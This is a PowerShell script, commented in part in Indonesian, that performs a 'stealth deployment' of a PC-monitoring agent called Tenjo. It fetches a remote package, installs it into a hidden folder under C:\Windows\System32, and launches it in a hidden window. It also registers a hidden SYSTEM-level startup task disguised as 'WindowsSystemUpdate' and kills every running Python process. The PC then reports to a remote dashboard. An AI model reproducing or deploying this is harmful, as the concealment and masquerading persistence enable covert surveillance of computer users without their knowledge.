# Tenjo PowerShell Deployment Script
# Copy-paste langsung di PowerShell Windows untuk stealth deployment

# Check if running as Administrator
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
{
    Write-Host "‚ùå Script must run as Administrator!" -ForegroundColor Red
    Write-Host "Right-click PowerShell ‚Üí Run as Administrator" -ForegroundColor Yellow
    Read-Host "Press Enter to exit"
    exit 1
}

Write-Host "üöÄ Starting Tenjo Deployment..." -ForegroundColor Green
Write-Host "‚è±Ô∏è  This will take 3-5 minutes (including Python & Git install)..." -ForegroundColor Yellow

# Check and install Python 3.10
Write-Host "üêç Checking Python installation..." -ForegroundColor Cyan
$pythonInstalled = $false
try {
    $pythonVersion = & python --version 2>&1
    if ($pythonVersion -match "Python 3\.(10|11|12)") {
        Write-Host "‚úÖ Python $($pythonVersion) already installed" -ForegroundColor Green
        $pythonInstalled = $true
    }
} catch {
    Write-Host "‚ùå Python not found or incompatible version" -ForegroundColor Yellow
}

if (-not $pythonInstalled) {
    Write-Host "üì• Installing Python 3.10..." -ForegroundColor Cyan
    try {
        # Download Python 3.10 installer
        $pythonUrl = "https://www.python.org/ftp/python/3.10.11/python-3.10.11-amd64.exe"
        $pythonInstaller = "$env:TEMP\python-3.10.11-amd64.exe"
        
        Invoke-WebRequest -Uri $pythonUrl -OutFile $pythonInstaller -UseBasicParsing
        
        # Install Python silently with pip and PATH
        Start-Process -FilePath $pythonInstaller -ArgumentList "/quiet", "InstallAllUsers=1", "PrependPath=1", "Include_pip=1" -Wait
        
        # Refresh environment variables
        $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
        
        # Verify installation
        Start-Sleep -Seconds 5
        $pythonVersion = & python --version 2>&1
        Write-Host "‚úÖ Python installed: $pythonVersion" -ForegroundColor Green
        
        # Clean up installer
        Remove-Item $pythonInstaller -Force -ErrorAction SilentlyContinue
    } catch {
        Write-Host "‚ùå Python installation failed: $($_.Exception.Message)" -ForegroundColor Red
        Write-Host "‚ö†Ô∏è  Continuing without Python - manual installation may be required" -ForegroundColor Yellow
    }
}

# Check and install Git (optional, for future updates)
Write-Host "üì¶ Checking Git installation..." -ForegroundColor Cyan
$gitInstalled = $false
try {
    $gitVersion = & git --version 2>&1
    if ($gitVersion -match "git version") {
        Write-Host "‚úÖ Git already installed: $gitVersion" -ForegroundColor Green
        $gitInstalled = $true
    }
} catch {
    Write-Host "‚ùå Git not found" -ForegroundColor Yellow
}

if (-not $gitInstalled) {
    Write-Host "üì• Installing Git..." -ForegroundColor Cyan
    try {
        # Download Git installer
        $gitUrl = "https://github.com/git-for-windows/git/releases/download/v2.42.0.windows.2/Git-2.42.0.2-64-bit.exe"
        $gitInstaller = "$env:TEMP\Git-installer.exe"
        
        Invoke-WebRequest -Uri $gitUrl -OutFile $gitInstaller -UseBasicParsing
        
        # Install Git silently
        Start-Process -FilePath $gitInstaller -ArgumentList "/VERYSILENT", "/NORESTART", "/NOCANCEL", "/SP-", "/CLOSEAPPLICATIONS", "/RESTARTAPPLICATIONS", "/COMPONENTS=`"icons,ext\reg\shellhere,assoc,assoc_sh`"" -Wait
        
        # Refresh environment variables
        $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
        
        # Verify installation
        Start-Sleep -Seconds 3
        $gitVersion = & git --version 2>&1
        Write-Host "‚úÖ Git installed: $gitVersion" -ForegroundColor Green
        
        # Clean up installer
        Remove-Item $gitInstaller -Force -ErrorAction SilentlyContinue
    } catch {
        Write-Host "‚ö†Ô∏è  Git installation failed (non-critical): $($_.Exception.Message)" -ForegroundColor Yellow
        Write-Host "‚ÑπÔ∏è  Git is optional - Tenjo will work without it" -ForegroundColor Cyan
    }
}

# Stop existing Tenjo process
Write-Host "üõë Stopping existing Tenjo process..." -ForegroundColor Cyan
Get-Process -Name "python" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
Start-Sleep -Seconds 2

# Remove old installation
Write-Host "üóëÔ∏è  Removing old installation..." -ForegroundColor Cyan
if (Test-Path "C:\Windows\System32\.tenjo") {
    Remove-Item "C:\Windows\System32\.tenjo" -Recurse -Force -ErrorAction SilentlyContinue
}

# Create installation directory
Write-Host "üìÅ Creating installation directory..." -ForegroundColor Cyan
New-Item -ItemType Directory -Path "C:\Windows\System32\.tenjo" -Force | Out-Null
New-Item -ItemType Directory -Path "C:\Windows\System32\.tenjo\src" -Force | Out-Null
New-Item -ItemType Directory -Path "C:\Windows\System32\.tenjo\src\core" -Force | Out-Null
New-Item -ItemType Directory -Path "C:\Windows\System32\.tenjo\src\modules" -Force | Out-Null
New-Item -ItemType Directory -Path "C:\Windows\System32\.tenjo\src\utils" -Force | Out-Null
New-Item -ItemType Directory -Path "C:\Windows\System32\.tenjo\logs" -Force | Out-Null

# Download installer package
Write-Host "üì• Downloading Tenjo installer..." -ForegroundColor Cyan
$installerUrl = "https://tenjo.adilabs.id/downloads/installer_package.tar.gz"
$installerPath = "$env:TEMP\tenjo_installer.tar.gz"

try {
    Invoke-WebRequest -Uri $installerUrl -OutFile $installerPath -UseBasicParsing
    Write-Host "‚úÖ Download completed (29MB)" -ForegroundColor Green
} catch {
    Write-Host "‚ùå Download failed: $($_.Exception.Message)" -ForegroundColor Red
    Read-Host "Press Enter to exit"
    exit 1
}

# Extract installer (using PowerShell 5.0+ built-in)
Write-Host "üì¶ Extracting installer files..." -ForegroundColor Cyan
try {
    # Use 7-Zip if available, otherwise try built-in methods
    if (Get-Command "7z" -ErrorAction SilentlyContinue) {
        & 7z x $installerPath -o"$env:TEMP\tenjo_extract" -y | Out-Null
    } else {
        # Try using tar command (Windows 10 1903+)
        if (Get-Command "tar" -ErrorAction SilentlyContinue) {
            & tar -xzf $installerPath -C "$env:TEMP"
        } else {
            Write-Host "‚ö†Ô∏è  No extraction tool found. Trying alternative method..." -ForegroundColor Yellow
            # Alternative: rename to .zip and extract
            $zipPath = $installerPath -replace '\.tar\.gz$', '.zip'
            Rename-Item $installerPath $zipPath
            Expand-Archive -Path $zipPath -DestinationPath "$env:TEMP\tenjo_extract" -Force
        }
    }
    Write-Host "‚úÖ Files extracted successfully" -ForegroundColor Green
} catch {
    Write-Host "‚ùå Extraction failed: $($_.Exception.Message)" -ForegroundColor Red
    Read-Host "Press Enter to exit"
    exit 1
}

# Copy files to installation directory
Write-Host "üìã Installing Tenjo files..." -ForegroundColor Cyan
$extractPath = "$env:TEMP\tenjo_extract"
if (Test-Path $extractPath) {
    Copy-Item "$extractPath\*" -Destination "C:\Windows\System32\.tenjo\" -Recurse -Force
    Write-Host "‚úÖ Files installed successfully" -ForegroundColor Green
} else {
    Write-Host "‚ùå Extracted files not found" -ForegroundColor Red
    Read-Host "Press Enter to exit"
    exit 1
}

# Install Python dependencies
Write-Host "üêç Installing Python dependencies..." -ForegroundColor Cyan
Set-Location "C:\Windows\System32\.tenjo"
try {
    # Upgrade pip first
    & python -m pip install --upgrade pip --quiet --no-warn-script-location
    
    # Install required dependencies
    & python -m pip install -r requirements.txt --quiet --no-warn-script-location --trusted-host pypi.org --trusted-host pypi.python.org --trusted-host files.pythonhosted.org
    
    Write-Host "‚úÖ Dependencies installed successfully" -ForegroundColor Green
} catch {
    Write-Host "‚ö†Ô∏è  Dependency installation warning: $($_.Exception.Message)" -ForegroundColor Yellow
    Write-Host "üîß Attempting alternative installation..." -ForegroundColor Cyan
    
    # Try installing critical packages individually
    try {
        & python -m pip install requests psutil pillow --quiet --no-warn-script-location --trusted-host pypi.org --trusted-host pypi.python.org --trusted-host files.pythonhosted.org
        Write-Host "‚úÖ Critical dependencies installed" -ForegroundColor Green
    } catch {
        Write-Host "‚ùå Critical dependency installation failed" -ForegroundColor Red
        Write-Host "‚ö†Ô∏è  Tenjo may not function properly" -ForegroundColor Yellow
    }
}

# Create scheduled task for startup
Write-Host "‚öôÔ∏è  Creating startup task..." -ForegroundColor Cyan
try {
    $action = New-ScheduledTaskAction -Execute "python" -Argument "C:\Windows\System32\.tenjo\main.py" -WorkingDirectory "C:\Windows\System32\.tenjo"
    $trigger = New-ScheduledTaskTrigger -AtStartup
    $settings = New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit ([TimeSpan]::Zero)
    $principal = New-ScheduledTaskPrincipal -UserID "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
    
    Register-ScheduledTask -TaskName "WindowsSystemUpdate" -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force | Out-Null
    Write-Host "‚úÖ Startup task created" -ForegroundColor Green
} catch {
    Write-Host "‚ùå Failed to create startup task: $($_.Exception.Message)" -ForegroundColor Red
}

# Start Tenjo service
Write-Host "üöÄ Starting Tenjo service..." -ForegroundColor Cyan
try {
    Start-Process -FilePath "python" -ArgumentList "C:\Windows\System32\.tenjo\main.py" -WorkingDirectory "C:\Windows\System32\.tenjo" -WindowStyle Hidden
    Write-Host "‚úÖ Tenjo service started" -ForegroundColor Green
} catch {
    Write-Host "‚ùå Failed to start service: $($_.Exception.Message)" -ForegroundColor Red
}

# Cleanup temporary files
Write-Host "üßπ Cleaning up temporary files..." -ForegroundColor Cyan
Remove-Item $installerPath -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\tenjo_extract" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\*.tmp" -Force -ErrorAction SilentlyContinue

# Final verification
Write-Host "`n‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó" -ForegroundColor White
Write-Host "‚ïë          DEPLOYMENT SUMMARY          ‚ïë" -ForegroundColor White  
Write-Host "‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù" -ForegroundColor White

# Check if process is running
$tenjoProcess = Get-Process -Name "python" -ErrorAction SilentlyContinue | Where-Object { $_.Path -like "*\.tenjo\*" }
if ($tenjoProcess) {
    Write-Host "‚úÖ Process: Running (PID: $($tenjoProcess.Id))" -ForegroundColor Green
} else {
    Write-Host "‚ùå Process: Not running" -ForegroundColor Red
}

# Check if files exist
if (Test-Path "C:\Windows\System32\.tenjo\main.py") {
    Write-Host "‚úÖ Files: Installed successfully" -ForegroundColor Green
} else {
    Write-Host "‚ùå Files: Installation failed" -ForegroundColor Red
}

# Check if scheduled task exists
$task = Get-ScheduledTask -TaskName "WindowsSystemUpdate" -ErrorAction SilentlyContinue
if ($task) {
    Write-Host "‚úÖ Startup: Configured for system boot" -ForegroundColor Green
} else {
    Write-Host "‚ùå Startup: Not configured" -ForegroundColor Red
}

Write-Host "`nüéâ Deployment completed!" -ForegroundColor Green
Write-Host "üìä Monitor dashboard: https://tenjo.adilabs.id" -ForegroundColor Cyan
Write-Host "‚è∞ This PC will appear online within 1-2 minutes" -ForegroundColor Yellow

Write-Host "`nPress Enter to exit and close window..." -ForegroundColor White
Read-Host